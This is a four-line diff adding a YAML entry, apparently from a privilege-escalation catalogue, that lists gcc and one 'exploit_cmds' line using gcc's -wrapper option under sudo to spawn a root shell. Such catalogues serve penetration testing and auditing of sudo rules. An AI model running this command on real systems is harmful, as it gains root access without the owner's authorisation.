@@ -1,0 +1,4 @@
+name: gcc
+binary_path: /usr/bin/gcc
+exploit_cmds:
+- sudo /usr/bin/gcc -wrapper /bin/sh,-s x
